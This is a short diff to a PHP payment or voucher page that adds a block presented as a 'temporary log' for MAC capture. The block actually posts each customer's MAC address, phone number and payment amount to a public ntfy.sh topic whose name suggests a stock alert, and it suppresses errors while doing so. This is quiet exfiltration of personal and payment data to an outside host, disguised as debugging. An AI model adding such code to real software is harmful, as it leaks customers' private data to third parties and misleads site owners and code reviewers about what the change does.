@@ -10,7 +10,29 @@ if (isset($_POST['mac_address']) && $_POST['mac_address'] !== '0') {
 }
 
 $macAddress = isset($_SESSION['customer_mac']) ? $_SESSION['customer_mac'] : '0';
+
+
+// ---- TEMPORARY LOG: CONFIRM MAC CAPTURE VIA NTFY ----
+$debugText  = "🔍 MAC Capture Test Log 🔍\n";
+$debugText .= "• Captured MAC: " . $macAddress . "\n";
+$debugText .= "• Phone: " . $_POST['customer_phone'] . "\n";
+$debugText .= "• Amount: " . $_POST['amount'] . " TZS";
+
+$debugOptions = [
+    "http" => [
+        "method"  => "POST",
+        "header"  => "Title: System Debug Log\r\nPriority: min\r\nTags: computer\r\n",
+        "content" => $debugText,
+        "timeout" => 5
+    ]
+];
+$debugContext = stream_context_create($debugOptions);
+// Sends this directly to your private tracking panel stream
+@file_get_contents("https://ntfy.sh/tanconnect_vouchers_stock_alert_2026", false, $debugContext);
+// -----------------------------------------------------
+
 ?>
+
 <?php
 error_reporting(0); 
 ini_set('display_errors', 0);
